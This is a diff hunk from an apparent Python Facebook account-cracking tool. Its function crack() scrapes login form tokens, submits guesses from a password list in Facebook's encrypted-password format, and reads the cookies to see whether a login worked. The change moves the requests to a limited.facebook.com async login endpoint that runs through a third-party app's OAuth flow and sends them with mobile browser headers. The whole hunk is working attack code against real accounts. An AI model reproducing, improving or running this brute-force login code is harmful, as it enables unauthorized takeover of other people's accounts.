@@ -171,33 +171,18 @@ def crack(uid, password_list, total_count):
             "viewport-width": "980"}
             requu1 = Session.get(url1,headers=head)
             log_data = {'m_ts': re.search('name="m_ts" value="(.*?)"',str(requu1.text)).group(1), 'li': re.search('name="li" value="(.*?)"',str(requu1.text)).group(1), 'try_number': '0', 'unrecognized_tries': '0', 'email': uid, 'prefill_contact_point': '', 'prefill_source': '', 'prefill_type': '', 'first_prefill_source': '', 'first_prefill_type': '', 'had_cp_prefilled': 'false', 'had_password_prefilled': 'false', 'is_smart_lock': 'false', 'bi_xrwh': '0', 'encpass': "#PWD_BROWSER:0:{}:{}".format(str(time.time()).split('.')[0], pw), 'bi_wvdp': '', 'fb_dtsg': '', 'jazoest': re.search('name="jazoest" value="(.*?)"',str(requu1.text)).group(1), 'lsd': re.search('name="lsd" value="(.*?)"',str(requu1.text)).group(1), '__dyn': '', '__csr': '', '__req': random.choice(["1","2","3","4","5","6","7","8","9","0"]), '__fmt': '0', '__a': '',  '__user': '0'}
-            url = "https://www.facebook.com/login/device-based/regular/login/?login_attempt=1&next=https%3A%2F%2Fdevelopers.facebook.com%2Fdocs%2Ffacebook-login%2Fios&lwv=100"
-            headers = {"authority": "www.facebook.com",
-            "method": "POST",
-            "path": "/login/device-based/regular/login/?login_attempt=1&next=https%3A%2F%2Fdevelopers.facebook.com%2Fdocs%2Ffacebook-login%2Fios&lwv=100",
-            "scheme": "https",
-            "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
-            "accept-encoding": "gzip, deflate, br",
-            "accept-language": "en-GB;q=0.9,en-US;q=0.8,en;q=0.7",
-            "cache-control": "max-age=0",
-            "content-type": "application/x-www-form-urlencoded",
-            "dpr": "3",
-            "origin": "https://www.facebook.com",
-            "referer": "https://www.facebook.com/login/?privacy_mutation_token=eyJ0eXBlIjowLCJjcmVhdGlvbl90aW1lIjoxNzM1MTM2NjI2LCJjYWxsc2l0ZV9pZCI6MjM5NDQ2MTI0MDg0ODgxN30%3D&next=https%3A%2F%2Fdevelopers.facebook.com%2Fdocs%2Ffacebook-login%2Fios",
-            "sec-ch-prefers-color-scheme": "light",
-            "sec-ch-ua": "\"Not-A.Brand\";v=\"99\", \"Chromium\";v=\"124\"",
-            "sec-ch-ua-full-version-list": "\"Not-A.Brand\";v=\"99.0.0.0\", \"Chromium\";v=\"124.0.6327.4\"",
-            "sec-ch-ua-mobile": "?0",
-            "sec-ch-ua-model": "\"\"",
-            "sec-ch-ua-platform": "\"Linux\"",
-            "sec-ch-ua-platform-version": "\"\"",
-            "sec-fetch-dest": "document",
-            "sec-fetch-mode": "navigate",
-           "sec-fetch-site": "same-origin",
-           "sec-fetch-user": "?1",
-           "upgrade-insecure-requests": "1",
-           "user-agent": us,
-           "viewport-width": "980"}           
+            url = "https://limited.facebook.com/login/device-based/login/async/?api_key=621206481228053&auth_token=8d53cc386ba64ee27ab19e8c022079fb&skip_api_login=1&signed_next=1&next=https%3A%2F%2Fwww.facebook.com%2Fdialog%2Foauth%3Fauth_type%3Drerequest%26client_id%3D621206481228053%26scope%3Duser_birthday%252Cuser_gender%252Cuser_age_range%252Cemail%26state%3DcsrfToken%252Coa7Nnqent9xM0zudcGzG%257CresumePath%252C%252Fas%252FHhVtgWhxp5%252Fresume%252Fas%252Fauthorization.ping%26redirect_uri%3Dhttps%253A%252F%252Feu.idp.adidas.com%252Fext%252Ffacebook-authn%252F%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3De2c75b2d-cd0f-46d4-80c7-bb7e62158972%26tp%3Dunspecified%26cbt%3D1765733602723&refsrc=deprecated&app_id=621206481228053&cancel=https%3A%2F%2Feu.idp.adidas.com%2Fext%2Ffacebook-authn%2F%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3DcsrfToken%252Coa7Nnqent9xM0zudcGzG%257CresumePath%252C%252Fas%252FHhVtgWhxp5%252Fresume%252Fas%252Fauthorization.ping%23_%3D_&lwv=100"
+            headers = {
+            'sec-ch-ua-platform': '"Android"',
+            'Referer': 'https://limited.facebook.com/login.php?skip_api_login=1&api_key=621206481228053&kid_directed_site=0&app_id=621206481228053&signed_next=1&next=https%3A%2F%2Fwww.facebook.com%2Fdialog%2Foauth%3Fauth_type%3Drerequest%26client_id%3D621206481228053%26scope%3Duser_birthday%252Cuser_gender%252Cuser_age_range%252Cemail%26state%3DcsrfToken%252Coa7Nnqent9xM0zudcGzG%257CresumePath%252C%252Fas%252FHhVtgWhxp5%252Fresume%252Fas%252Fauthorization.ping%26redirect_uri%3Dhttps%253A%252F%252Feu.idp.adidas.com%252Fext%252Ffacebook-authn%252F%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3De2c75b2d-cd0f-46d4-80c7-bb7e62158972%26tp%3Dunspecified&cancel_url=https%3A%2F%2Feu.idp.adidas.com%2Fext%2Ffacebook-authn%2F%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3DcsrfToken%252Coa7Nnqent9xM0zudcGzG%257CresumePath%252C%252Fas%252FHhVtgWhxp5%252Fresume%252Fas%252Fauthorization.ping%23_%3D_&display=page&locale=bn_IN&pl_dbl=0',
+            'sec-ch-ua': '"Google Chrome";v="143", "Chromium";v="143", "Not A(Brand";v="24"',
+            'X-Response-Format': 'JSONStream',
+            'sec-ch-ua-mobile': '?1',
+            'X-ASBD-ID': '359341',
+            'X-FB-LSD': re.search('name="lsd" value="(.*?)"',str(requu1.text)).group(1),
+            'X-Requested-With': 'XMLHttpRequest',
+            'User-Agent': us,
+            'Content-Type': 'application/x-www-form-urlencoded',}           
             respon = Session.post(url,data=log_data,headers=headers,allow_redirects=False)
             log_cookies = Session.cookies.get_dict().keys()
             # Check response
